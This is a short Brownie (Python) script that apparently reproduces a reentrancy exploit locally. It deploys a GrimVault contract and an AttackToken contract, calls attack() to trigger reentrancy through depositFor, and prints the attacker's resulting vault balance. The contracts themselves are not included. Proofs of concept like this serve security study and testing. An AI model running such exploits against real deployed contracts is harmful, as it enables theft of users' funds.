from brownie import accounts, GrimVault, AttackToken,chain
from brownie.network import priority_fee
from rich import print as rp

def main():
    priority_fee('auto')
    grim=GrimVault.deploy({'from':accounts[0]})
    attk=AttackToken.deploy(grim,{'from':accounts[0]})
    rp('[bold green]------> Step 1: Call depositFor function contract which should result in reentrancy')
    attk.attack()
    rp(f'[bold]Balance of account after calling deposit is: [/] {grim.balanceOf(attk)}')


